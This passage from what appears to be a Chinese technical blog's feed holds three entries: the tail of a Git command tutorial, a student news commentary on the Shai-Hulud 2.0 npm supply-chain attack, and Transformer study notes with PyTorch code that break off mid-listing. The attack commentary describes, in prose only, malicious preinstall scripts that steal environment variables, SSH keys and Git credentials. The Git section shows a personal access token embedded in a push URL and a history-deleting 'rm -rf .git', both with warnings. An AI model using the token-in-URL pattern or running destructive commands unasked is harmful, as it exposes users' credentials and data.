<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一次性使用PAT推送，不修改远程URL</span></span><br><span class="line">git push https://&lt;username&gt;:&lt;PAT&gt;@github.com/&lt;username&gt;/&lt;repository&gt;.git main</span><br></pre></td></tr></table></figure>

<p><strong>移除 URL 中的 PAT（提高安全性）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 移除URL中的PAT，改为使用credential helper</span></span><br><span class="line">git remote set-url origin https://github.com/&lt;username&gt;/&lt;repository&gt;.git</span><br><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure>

<h3 id="⚠️-重要提醒"><a href="#⚠️-重要提醒" class="headerlink" title="⚠️ 重要提醒"></a>⚠️ 重要提醒</h3><ul>
<li><strong>PAT 等同于密码</strong> - 请妥善保管，不要分享给他人</li>
<li><strong>定期更新</strong> - 建议设置合理的过期时间并定期更新</li>
<li><strong>最小权限原则</strong> - 只授予必要的权限范围</li>
<li><strong>避免硬编码</strong> - 不要在代码中直接写入PAT</li>
<li><strong>撤销泄露的 Token</strong> - 如果PAT泄露，立即在GitHub设置中撤销</li>
</ul>
<h2 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h2><h3 id="创建并切换分支"><a href="#创建并切换分支" class="headerlink" title="创建并切换分支"></a>创建并切换分支</h3><p><strong>创建新分支并切换：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;新分支名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b feature-login</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个名为 <code>feature-login</code> 的新分支，并立即切换到该分支</li>
<li>等同于 <code>git branch feature-login</code> + <code>git checkout feature-login</code></li>
</ul>
<p><strong>新版本推荐写法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git switch -c &lt;新分支名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>重命名分支：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -M &lt;新分支名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -M main</span><br></pre></td></tr></table></figure>

<ul>
<li>强制重命名当前分支为 <code>main</code></li>
<li><code>-M</code> 是 <code>--move --force</code> 的缩写</li>
</ul>
<p><strong>查看所有分支：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure>

<p><strong>删除分支：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -d &lt;分支名&gt;    <span class="comment"># 安全删除（已合并的分支）</span></span><br><span class="line">git branch -D &lt;分支名&gt;    <span class="comment"># 强制删除</span></span><br></pre></td></tr></table></figure>

<h2 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h2><h3 id="添加文件到暂存区"><a href="#添加文件到暂存区" class="headerlink" title="添加文件到暂存区"></a>添加文件到暂存区</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .                    <span class="comment"># 添加所有修改的文件</span></span><br><span class="line">git add &lt;文件名&gt;             <span class="comment"># 添加指定文件</span></span><br><span class="line">git add *.js                 <span class="comment"># 添加所有 .js 文件</span></span><br></pre></td></tr></table></figure>

<p><strong>常用选项：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add -A                   <span class="comment"># 添加所有变化（包括删除）</span></span><br><span class="line">git add -u                   <span class="comment"># 只添加已跟踪文件的修改</span></span><br></pre></td></tr></table></figure>

<p><strong>查看暂存区状态：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<h3 id="提交暂存区到本地仓库"><a href="#提交暂存区到本地仓库" class="headerlink" title="提交暂存区到本地仓库"></a>提交暂存区到本地仓库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;你的提交信息&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;feat: add user login feature&quot;</span></span><br><span class="line">git commit -m <span class="string">&quot;fix: resolve memory leak issue&quot;</span></span><br><span class="line">git commit -m <span class="string">&quot;docs: update README&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>提交规范建议：</strong></p>
<ul>
<li><code>feat</code>: 新功能</li>
<li><code>fix</code>: 修复bug</li>
<li><code>docs</code>: 文档更新</li>
<li><code>style</code>: 代码格式调整</li>
<li><code>refactor</code>: 重构代码</li>
<li><code>test</code>: 测试相关</li>
<li><code>chore</code>: 构建&#x2F;工具链相关</li>
</ul>
<p><strong>快捷提交（跳过暂存区）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -am <span class="string">&quot;提交信息&quot;</span>    <span class="comment"># 自动添加已跟踪文件的修改并提交</span></span><br></pre></td></tr></table></figure>

<p><strong>修改最后一次提交：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit --amend -m <span class="string">&quot;新的提交信息&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="从暂存区移除文件"><a href="#从暂存区移除文件" class="headerlink" title="从暂存区移除文件"></a>从暂存区移除文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> --cached &lt;文件名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> --cached config.json</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li>将文件从 Git 跟踪中移除，但保留在工作目录中</li>
<li>常用于误添加的敏感文件（如配置文件、密钥等）</li>
<li>建议同时将文件添加到 <code>.gitignore</code></li>
</ul>
<p><strong>完全删除文件：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> &lt;文件名&gt;              <span class="comment"># 从工作目录和暂存区同时删除</span></span><br></pre></td></tr></table></figure>

<h2 id="协作开发"><a href="#协作开发" class="headerlink" title="协作开发"></a>协作开发</h2><h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;仓库URL&gt;</span><br><span class="line">git <span class="built_in">clone</span> &lt;仓库URL&gt; &lt;自定义目录名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xxx/repository-name.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/xxx/repository-name.git my-project</span><br></pre></td></tr></table></figure>

<p><strong>克隆指定分支：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b &lt;分支名&gt; &lt;仓库URL&gt;</span><br></pre></td></tr></table></figure>

<p><strong>浅克隆（只克隆最近的提交历史）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 &lt;仓库URL&gt;</span><br></pre></td></tr></table></figure>

<h3 id="拉取远程更新"><a href="#拉取远程更新" class="headerlink" title="拉取远程更新"></a>拉取远程更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull                     <span class="comment"># 拉取并合并当前分支</span></span><br><span class="line">git pull origin main         <span class="comment"># 拉取指定远程分支并合并</span></span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><code>git pull</code> &#x3D; <code>git fetch</code> + <code>git merge</code></li>
<li>建议使用 <code>git fetch</code> + <code>git merge</code> 以便更好地控制合并过程</li>
</ul>
<h3 id="添加上游仓库-用于-Fork-后同步"><a href="#添加上游仓库-用于-Fork-后同步" class="headerlink" title="添加上游仓库 (用于 Fork 后同步)"></a>添加上游仓库 (用于 Fork 后同步)</h3><p>当你 Fork 了一个开源项目后，需要添加原仓库作为上游源，以便同步最新更新。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add upstream &lt;原作者仓库的URL&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add upstream https://github.com/original-author/repository-name.git</span><br></pre></td></tr></table></figure>

<p><strong>查看远程仓库配置：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line"><span class="comment"># origin    https://github.com/xxx/repository-name.git (fetch)</span></span><br><span class="line"><span class="comment"># origin    https://github.com/xxx/repository-name.git (push)</span></span><br><span class="line"><span class="comment"># upstream  https://github.com/original-author/repository-name.git (fetch)</span></span><br><span class="line"><span class="comment"># upstream  https://github.com/original-author/repository-name.git (push)</span></span><br></pre></td></tr></table></figure>

<h3 id="从上游仓库同步更新"><a href="#从上游仓库同步更新" class="headerlink" title="从上游仓库同步更新"></a>从上游仓库同步更新</h3><p><strong>完整流程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 获取上游仓库的更新</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 切换到本地主分支</span></span><br><span class="line">git checkout main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 合并上游的更新</span></span><br><span class="line">git merge upstream/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 推送到自己的远程仓库</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<p><strong>使用 rebase 方式同步（保持提交历史整洁）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch upstream</span><br><span class="line">git rebase upstream/main</span><br><span class="line">git push origin main --force-with-lease</span><br></pre></td></tr></table></figure>

<h2 id="撤销与重置"><a href="#撤销与重置" class="headerlink" title="撤销与重置"></a>撤销与重置</h2><h3 id="撤销工作区的修改"><a href="#撤销工作区的修改" class="headerlink" title="撤销工作区的修改"></a>撤销工作区的修改</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- &lt;文件名&gt;     <span class="comment"># 撤销单个文件的修改</span></span><br><span class="line">git checkout -- .            <span class="comment"># 撤销所有文件的修改</span></span><br></pre></td></tr></table></figure>

<p><strong>新版本推荐：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git restore &lt;文件名&gt;</span><br><span class="line">git restore .</span><br></pre></td></tr></table></figure>

<h3 id="撤销暂存区的文件"><a href="#撤销暂存区的文件" class="headerlink" title="撤销暂存区的文件"></a>撤销暂存区的文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;文件名&gt;      <span class="comment"># 将文件从暂存区移除，但保留修改</span></span><br></pre></td></tr></table></figure>

<p><strong>新版本推荐：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git restore --staged &lt;文件名&gt;</span><br></pre></td></tr></table></figure>

<h3 id="回退提交"><a href="#回退提交" class="headerlink" title="回退提交"></a>回退提交</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --soft HEAD~1      <span class="comment"># 撤销最后一次提交，保留修改在暂存区</span></span><br><span class="line">git reset --mixed HEAD~1     <span class="comment"># 撤销最后一次提交，保留修改在工作区（默认）</span></span><br><span class="line">git reset --hard HEAD~1      <span class="comment"># 撤销最后一次提交，丢弃所有修改（危险）</span></span><br></pre></td></tr></table></figure>

<p><strong>回退到指定提交：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard &lt;commit-hash&gt;</span><br></pre></td></tr></table></figure>

<h3 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span>                      <span class="comment"># 查看详细提交历史</span></span><br><span class="line">git <span class="built_in">log</span> --oneline            <span class="comment"># 查看简洁的提交历史</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline    <span class="comment"># 图形化显示分支历史</span></span><br><span class="line">git <span class="built_in">log</span> -n 5                 <span class="comment"># 只显示最近5条提交</span></span><br></pre></td></tr></table></figure>

<h3 id="清理仓库"><a href="#清理仓库" class="headerlink" title="清理仓库"></a>清理仓库</h3><p><strong>删除未跟踪的文件：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git clean -n                 <span class="comment"># 预览将要删除的文件</span></span><br><span class="line">git clean -f                 <span class="comment"># 删除未跟踪的文件</span></span><br><span class="line">git clean -fd                <span class="comment"># 删除未跟踪的文件和目录</span></span><br></pre></td></tr></table></figure>

<h3 id="重新初始化仓库（危险操作）"><a href="#重新初始化仓库（危险操作）" class="headerlink" title="重新初始化仓库（危险操作）"></a>重新初始化仓库（危险操作）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf .git                  <span class="comment"># 删除 Git 历史记录</span></span><br><span class="line">git init                     <span class="comment"># 重新初始化仓库</span></span><br></pre></td></tr></table></figure>

<p>⚠️ <strong>警告</strong>：</p>
<ul>
<li>此操作会永久删除所有提交历史</li>
<li>无法恢复，请确保已备份重要数据</li>
<li>仅在确实需要清除历史时使用</li>
</ul>
<h2 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h2><h3 id="查看文件修改"><a href="#查看文件修改" class="headerlink" title="查看文件修改"></a>查看文件修改</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git diff                     <span class="comment"># 查看工作区与暂存区的差异</span></span><br><span class="line">git diff --staged            <span class="comment"># 查看暂存区与最后一次提交的差异</span></span><br><span class="line">git diff HEAD                <span class="comment"># 查看工作区与最后一次提交的差异</span></span><br></pre></td></tr></table></figure>

<h3 id="暂存当前工作"><a href="#暂存当前工作" class="headerlink" title="暂存当前工作"></a>暂存当前工作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash                    <span class="comment"># 暂存当前修改</span></span><br><span class="line">git stash list               <span class="comment"># 查看暂存列表</span></span><br><span class="line">git stash pop                <span class="comment"># 恢复最近的暂存并删除</span></span><br><span class="line">git stash apply              <span class="comment"># 恢复最近的暂存但不删除</span></span><br><span class="line">git stash drop               <span class="comment"># 删除最近的暂存</span></span><br></pre></td></tr></table></figure>

<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag                      <span class="comment"># 查看所有标签</span></span><br><span class="line">git tag v1.0.0               <span class="comment"># 创建轻量标签</span></span><br><span class="line">git tag -a v1.0.0 -m <span class="string">&quot;版本说明&quot;</span>  <span class="comment"># 创建附注标签</span></span><br><span class="line">git push origin v1.0.0       <span class="comment"># 推送标签到远程</span></span><br><span class="line">git push origin --tags       <span class="comment"># 推送所有标签</span></span><br></pre></td></tr></table></figure>

<h3 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h3><p>创建 <code>.gitignore</code> 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 忽略所有 .log 文件</span></span><br><span class="line">*.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略 node_modules 目录</span></span><br><span class="line">node_modules/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略配置文件</span></span><br><span class="line">config.json</span><br><span class="line">.<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 但不忽略特定文件</span></span><br><span class="line">!important.log</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>GitHub</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>新一波npm供应链攻击爆发</title>
    <url>/2025/11/28/Shai%20Hulud%202.0%EF%BC%9A%E6%96%B0%E4%B8%80%E6%B3%A2npm%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E7%88%86%E5%8F%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全资讯作业"><a href="#软件安全资讯作业" class="headerlink" title="软件安全资讯作业"></a>软件安全资讯作业</h2><h3 id="新闻链接"><a href="#新闻链接" class="headerlink" title="新闻链接"></a>新闻链接</h3><p><a href="https://thehackernews.com/2025/11/weekly-recap-fortinet-exploit-chrome-0.html">https://thehackernews.com/2025/11/weekly-recap-fortinet-exploit-chrome-0.html</a></p>
<h3 id="资讯描述"><a href="#资讯描述" class="headerlink" title="资讯描述"></a>资讯描述</h3><p>本周，安全研究机构披露了名为“Shai-Hulud 2.0”的大规模npm供应链攻击，成为开源生态近期讨论最热的软件安全事件之一。攻击者在 11 月下旬短时间内上传了多个伪装成正常依赖的恶意包，这些包通过模仿常用库的名称和功能描述，使开发者在更新依赖或安装新组件时难以察觉异常。研究人员指出，这一轮攻击比前代更具隐蔽性，许多恶意代码藏在preinstall阶段，开发者甚至在运行应用之前就已经“中招”。</p>
<p>更令人担忧的是，Shai-Hulud 2.0具备链式传播特征。npm本身依赖结构复杂，一个项目往往包含几十甚至上百个子依赖，只要一个底层包被污染，就可能通过构建体系被扩散到大量使用者的环境中。攻击者正是利用这一点，通过极小的投毒入口，触发极大范围的依赖污染，使风险迅速蔓延到多个组织的开发机、构建服务器乃至自动部署管线。</p>
<p>此外，安全团队发现此次攻击的目标不再局限于个人开发者，而是明显指向CI&#x2F;CD环境、自动化构建脚本与云API凭证盗取。恶意包会主动扫描环境变量、SSH Key、Git配置文件，并尝试上报至攻击者服务器。这意味着任何执行该包的机器，包括企业内部的流水线系统，都可能被当作“跳板”继续扩散攻击，使其破坏力远超以往常见的npm投毒事件。Shai-Hulud 2.0的出现再次证明，供应链攻击已成为当前软件安全领域最值得关注的威胁之一。</p>
<h3 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h3><p>Shai-Hulud 2.0事件带给软件行业最重要的警示是：现代软件开发已经不再只依赖开发者自身的代码，而是依赖一个庞大且复杂的开源生态体系。当依赖数量呈指数级增长时，“信任”本身就成为最大的安全隐患。npm生态的便利性建立在默认信任机制之上，而攻击者正是利用这种结构性的弱点完成投毒与传播，使得一次小规模的污染可以在极短时间内影响成千上万的项目。</p>
<p>这一事件展示了“软件供应链攻击”的典型特征：攻击者不需要突破企业边界，也无需入侵服务器。他们只需投毒一个依赖包，就能直接进入企业内部环境，获取凭证、修改流水线或植入后门。正因如此，这类攻击往往比传统漏洞更具有破坏力，因为它突破的不是代码漏洞，而是整个生态的信任模型。</p>
<p>因此，Shai-Hulud 2.0不仅是一次攻击事件，也是对整个行业的一次提醒。开发团队必须摒弃“开源依赖默认可信”的错误观念，建立更严格的依赖审计制度，引入SBOM（软件物料清单）、行为监测、构建沙箱等机制，将供应链安全纳入整体防护体系之中。只有当开发者真正意识到依赖本身也是“代码”，并且具有等同甚至更高的风险，类似事件才不会反复出现。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>资讯作业</tag>
        <tag>软件安全</tag>
        <tag>北邮</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer相关学习</title>
    <url>/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Transformer简介"><a href="#Transformer简介" class="headerlink" title="Transformer简介"></a>Transformer简介</h2><h3 id="为什么需要Transformer模型"><a href="#为什么需要Transformer模型" class="headerlink" title="为什么需要Transformer模型"></a>为什么需要Transformer模型</h3><p><strong>背景与动机</strong></p>
<p>随着自然语言处理（NLP）技术的快速发展，传统的序列模型逐渐暴露出明显的局限性：</p>
<p><strong>传统RNN&#x2F;LSTM的瓶颈</strong></p>
<ul>
<li><strong>计算效率低</strong>：必须按时间步顺序处理，无法并行计算，训练速度慢</li>
<li><strong>长期依赖问题</strong>：虽然LSTM通过门控机制缓解了梯度消失，但对于超长序列仍然难以捕捉远距离依赖关系</li>
<li><strong>信息传递路径长</strong>：信息需要逐步传递，容易造成信息损失</li>
</ul>
<p><strong>Transformer的创新突破</strong></p>
<p>2017年，Google团队在论文《Attention is All You Need》中提出了Transformer架构，完全抛弃了循环结构，转而采用：</p>
<ul>
<li><strong>自注意力机制（Self-Attention）</strong>：允许模型直接建模序列中任意两个位置之间的关系</li>
<li><strong>多头注意力（Multi-Head Attention）</strong>：从多个角度并行捕捉不同的语义信息</li>
<li><strong>并行计算</strong>：所有位置可以同时处理，大幅提升训练效率</li>
</ul>
<h3 id="Transformer模型的核心特点"><a href="#Transformer模型的核心特点" class="headerlink" title="Transformer模型的核心特点"></a>Transformer模型的核心特点</h3><p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/0d386847-d62e-4aaa-bcef-06ec8499ab15.png" alt="89a67ca3e34e8114dcf669f7c33fb3dd_720.png"></p>
<h3 id="Transformer模型的核心特点-1"><a href="#Transformer模型的核心特点-1" class="headerlink" title="Transformer模型的核心特点"></a>Transformer模型的核心特点</h3><p><strong>整体架构</strong></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/0d386847-d62e-4aaa-bcef-06ec8499ab15.png" alt="Transformer架构图"></p>
<p>Transformer采用经典的<strong>编码器-解码器（Encoder-Decoder）</strong>架构：</p>
<ul>
<li><strong>编码器（Encoder）</strong>：负责理解输入序列，提取语义特征</li>
<li><strong>解码器（Decoder）</strong>：基于编码器的输出，生成目标序列</li>
<li><strong>层数设计</strong>：原始论文中编码器和解码器各包含6层相同结构的子层</li>
</ul>
<p><strong>三大核心特性</strong></p>
<p><strong>1. 自注意力机制（Self-Attention）</strong></p>
<p>这是Transformer最核心的创新。传统模型只能关注局部上下文或固定窗口内的信息，而自注意力机制允许：</p>
<ul>
<li>每个位置可以<strong>直接</strong>关注到序列中的所有其他位置</li>
<li>动态计算不同位置之间的相关性权重</li>
<li>无视距离远近，直接建模长距离依赖关系</li>
</ul>
<p><strong>2. 并行计算能力</strong></p>
<p>与RNN&#x2F;LSTM的顺序处理不同，Transformer具有天然的并行性：</p>
<ul>
<li>所有位置的表示可以<strong>同时计算</strong>，无需等待前一时刻的结果</li>
<li>充分利用现代GPU的并行计算能力</li>
<li>训练速度相比RNN提升数倍甚至数十倍</li>
</ul>
<p><strong>3. 灵活的任务适应性</strong></p>
<p>Transformer的架构设计极具通用性：</p>
<ul>
<li><strong>可变长度输入</strong>：通过位置编码支持任意长度的序列</li>
<li><strong>可扩展性强</strong>：通过增加层数和注意力头数提升模型容量</li>
<li><strong>多任务适用</strong>：不仅限于机器翻译，还广泛应用于文本生成、分类、问答、摘要等任务</li>
<li><strong>迁移学习基础</strong>：成为BERT、GPT等预训练模型的基础架构</li>
</ul>
<h3 id="内部机制概述"><a href="#内部机制概述" class="headerlink" title="内部机制概述"></a>内部机制概述</h3><p><strong>Transformer的整体工作流程</strong></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image.png" alt="Transformer工作流程图1"></p>
<p>上图展示了Transformer的基本输入输出流程。输入序列经过嵌入层和位置编码后，进入编码器进行特征提取。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%201.png" alt="编码器内部结构"></p>
<p>编码器通过多头注意力机制捕捉序列内部的依赖关系，然后通过前馈网络进行特征变换。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%202.png" alt="解码器工作机制"></p>
<p>解码器在生成目标序列时，不仅关注自身已生成的内容（自注意力），还需要关注编码器的输出（交叉注意力）。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%203.png" alt="注意力机制可视化"></p>
<p>注意力权重的可视化展示了模型如何在不同位置之间建立关联。颜色越深表示注意力权重越大。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%204.png" alt="多层堆叠效果"></p>
<p>通过堆叠多层编码器和解码器，模型能够学习到从低级到高级的特征表示。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%205.png" alt="完整架构总览"></p>
<p>这是Transformer的完整架构图，清晰展示了数据流动的全过程：从输入嵌入、位置编码，经过多层编码器和解码器，最终输出预测结果。</p>
<h3 id="Encoder（编码器）"><a href="#Encoder（编码器）" class="headerlink" title="Encoder（编码器）"></a>Encoder（编码器）</h3><p><strong>编码器的组成与作用</strong></p>
<p>编码器由<strong>多头注意力机制（Multi-Head Attention）</strong>和<strong>前馈神经网络（Feed Forward Network）</strong>两个核心模块构成。原始Transformer使用6层编码器堆叠，每层都包含相同的结构但参数独立。</p>
<p><strong>分层特征提取</strong></p>
<ul>
<li><strong>底层</strong>：关注词汇的基本关系和短期依赖，识别基本的语法模式</li>
<li><strong>中间层</strong>：识别更长范围的依赖关系，捕捉词语之间的语义关联</li>
<li><strong>高层</strong>：关注整个句子的结构和深层语义，如句子级别的语法关系或情感倾向</li>
</ul>
<p>通过多层结构，Transformer在每一层中对信息进行渐进的抽象和加工，最终获得高层次的、能够适应各种任务的表示。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%206.png" alt="编码器结构示意图1"></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%207.png" alt="编码器数据流动"></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%208.png" alt="编码器层级结构"></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%209.png" alt="编码器输出特征"></p>
<h3 id="Decoder（解码器）"><a href="#Decoder（解码器）" class="headerlink" title="Decoder（解码器）"></a>Decoder（解码器）</h3><p><strong>解码器的结构特点</strong></p>
<p>解码器同样由6层堆叠而成，但每层包含<strong>三个</strong>子模块（比编码器多一个）：</p>
<ol>
<li><strong>带掩码的多头注意力层</strong>：采用Masked操作，确保生成过程的自回归特性</li>
<li><strong>编码器-解码器注意力层</strong>：K和V矩阵来自编码器输出，Q矩阵来自解码器自身</li>
<li><strong>前馈神经网络层</strong>：与编码器中的结构相同</li>
</ol>
<p><strong>掩码机制（Mask）</strong></p>
<p>Transformer中使用两种掩码：</p>
<ul>
<li><strong>Padding Mask</strong>：在较短序列后填充0，避免模型关注填充位置</li>
<li><strong>Sequence Mask</strong>：确保解码时只能依赖当前时刻之前的输出，不能”看到未来”</li>
</ul>
<p><strong>编码器输出矩阵C</strong></p>
<p>编码器的输出是一个 n×d 的矩阵，其中：</p>
<ul>
<li>n：输入序列长度</li>
<li>d：特征维度（由隐藏层维度决定）</li>
</ul>
<p>该矩阵包含了输入序列每个元素的上下文嵌入表示，作为解码器交叉注意力的键值对。</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image%2010.png" alt="解码器结构图"></p>
<h2 id="Transformer模型实现"><a href="#Transformer模型实现" class="headerlink" title="Transformer模型实现"></a>Transformer模型实现</h2><p>本节将详细介绍Transformer各个组件的PyTorch实现，包括输入嵌入、位置编码、注意力机制等核心模块。</p>
<h3 id="输入嵌入（Input-Embeddings）"><a href="#输入嵌入（Input-Embeddings）" class="headerlink" title="输入嵌入（Input Embeddings）"></a>输入嵌入（Input Embeddings）</h3><p><strong>功能说明</strong></p>
<p>将离散的token ID转换为连续的向量表示。例如，将句子”Your cat is a lovely cat”转换为512维向量序列。</p>
<p><strong>实现细节</strong></p>
<ul>
<li>使用PyTorch的<code>nn.Embedding</code>层实现token到向量的映射</li>
<li>每个token ID对应一个固定的512维向量（可学习参数）</li>
<li>输出向量乘以√d_model进行缩放（论文3.4节要求）</li>
</ul>
<p><strong>缩放的数学原理</strong></p>
<p>缩放操作使嵌入向量的L2范数与维度无关，避免在后续与位置编码相加时某个分量过大。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">InputEmbeddings</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;词嵌入层：将token ID转换为连续向量&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model: <span class="built_in">int</span>, vocab_size: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            d_model: 嵌入向量维度（如512）</span></span><br><span class="line"><span class="string">            